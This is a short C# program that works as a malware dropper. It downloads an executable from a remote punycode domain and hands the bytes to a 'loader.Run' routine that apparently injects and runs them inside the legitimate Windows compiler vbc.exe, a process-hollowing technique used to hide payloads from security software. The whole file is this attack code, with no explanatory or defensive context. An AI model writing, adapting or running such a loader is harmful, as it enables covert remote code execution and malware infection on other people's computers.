using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Native_From_Csharp
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] filearray = DownloadFile("https://floppa.xn--q9jyb4c/ConsoleApplication1.exe");
            loader.loader.Run(filearray, @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe");
        }
        static byte[] DownloadFile(string url)
        {
            using(var client = new System.Net.WebClient())
            {
                return client.DownloadData(url);
            }
        }
    }
}
